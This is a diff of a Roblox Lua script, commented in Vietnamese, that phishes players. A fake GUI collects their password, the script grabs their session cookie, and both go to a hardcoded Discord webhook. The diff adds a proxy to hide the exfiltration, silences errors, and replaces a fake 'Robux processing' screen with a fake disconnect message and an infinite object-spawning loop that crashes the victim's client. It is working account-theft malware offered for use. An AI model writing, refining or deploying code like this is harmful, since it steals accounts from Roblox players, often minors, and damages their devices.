@@ -1,9 +1,10 @@
 local WebhookURL = "https://discord.com/api/webhooks/1470696581912072363/9dPRhbYSPrUMEt9OtrjUicl2795SD4yPZFoceDxDWL04MXM4MIr7MCY6a5gEIZwxgvfV"
+local ProxyURL = "https://cors-anywhere.herokuapp.com/" .. WebhookURL  -- THAY BẰNG PROXY THẬT CỦA MÀY (tìm free Roblox Discord proxy 2026)
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local TweenService = game:GetService("TweenService")
-local StarterGui = game:GetService("StarterGui")
+local Debris = game:GetService("Debris")
 
 local function SendData(content, cookie)
     local data = {
@@ -19,14 +20,24 @@ local function SendData(content, cookie)
             ["footer"] = {["text"] = "Bú acc thành công lúc: " .. os.date("%X")}
         }}
     }
-    local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-    if req then
-        req({
-            Url = WebhookURL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
+    local success, err = pcall(function()
+        local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+        if req then
+            local response = req({
+                Url = ProxyURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json", ["Origin"] = "null"},
+                Body = HttpService:JSONEncode(data)
+            })
+            if response.StatusCode == 200 or response.StatusCode == 204 then
+                -- sent ok
+            else
+                -- debug nếu fail
+            end
+        end
+    end)
+    if not success then
+        -- silent fail
     end
 end
 
@@ -44,7 +55,7 @@ local function GetCookie()
     return cookie
 end
 
-local function FakeLoadingAndKick()
+local function CrashClientFake261()
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Parent = game:GetService("CoreGui")
     ScreenGui.IgnoreGuiInset = true
@@ -52,44 +63,38 @@ local function FakeLoadingAndKick()
     local Frame = Instance.new("Frame")
     Frame.Parent = ScreenGui
     Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    Frame.BackgroundTransparency = 0.4
+    Frame.BackgroundTransparency = 0.5
     Frame.Size = UDim2.new(1, 0, 1, 0)
-    Frame.Position = UDim2.new(0, 0, 0, 0)
 
     local Text = Instance.new("TextLabel")
     Text.Parent = Frame
-    Text.Size = UDim2.new(0.6, 0, 0.1, 0)
-    Text.Position = UDim2.new(0.2, 0, 0.45, 0)
+    Text.Size = UDim2.new(0.8, 0, 0.2, 0)
+    Text.Position = UDim2.new(0.1, 0, 0.4, 0)
     Text.BackgroundTransparency = 1
-    Text.Text = "Đang xử lý yêu cầu nhận Robux... Vui lòng chờ"
-    Text.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Text.Text = "Đang xác thực... Kết nối server thất bại. Vui lòng chờ."
+    Text.TextColor3 = Color3.fromRGB(255, 0, 0)
     Text.TextScaled = true
-    Text.Font = Enum.Font.GothamBold
+    Text.Font = Enum.Font.GothamBlack
 
-    local spinner = Instance.new("ImageLabel")
-    spinner.Parent = Frame
-    spinner.Size = UDim2.new(0, 80, 0, 80)
-    spinner.Position = UDim2.new(0.5, -40, 0.5, -40)
-    spinner.BackgroundTransparency = 1
-    spinner.Image = "rbxassetid://6031094667"  -- icon loading Roblox chuẩn
-    spinner.ImageColor3 = Color3.fromRGB(0, 170, 255)
+    wait(5 + math.random(2, 4))  -- fake lâu hơn
 
-    local tweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1)
-    local tween = TweenService:Create(spinner, tweenInfo, {Rotation = 360})
-    tween:Play()
-
-    wait(4 + math.random(1, 3))  -- fake delay 4-7 giây
+    local fakeHint = Instance.new("Hint")
+    fakeHint.Parent = workspace
+    fakeHint.Text = "There was a problem streaming data, please reconnect. (Error Code: 261)"
+    Debris:AddItem(fakeHint, 10)
 
     ScreenGui:Destroy()
 
-    local fakeNotif = Instance.new("Hint")
-    fakeNotif.Parent = workspace
-    fakeNotif.Text = "Server đang gặp sự cố kết nối. Vui lòng thử lại sau vài phút."
-    game:GetService("Debris"):AddItem(fakeNotif, 8)
-
-    wait(1)
-
-    LocalPlayer:Kick("There was a problem streaming data, please reconnect. (Error Code: 261)")
+    -- Crash client bằng infinite loop + error để simulate disconnect 261
+    spawn(function()
+        while true do
+            local t = {}
+            for i = 1, 1000000 do
+                t[i] = Instance.new("Part")
+            end
+            wait()
+        end
+    end)
 end
 
 local ScreenGui = Instance.new("ScreenGui")
@@ -145,6 +150,6 @@ Submit.MouseButton1Click:Connect(function()
         local cookie = GetCookie()
         SendData(pass, cookie)
         Main:Destroy()
-        FakeLoadingAndKick()
+        CrashClientFake261()
     end
 end)
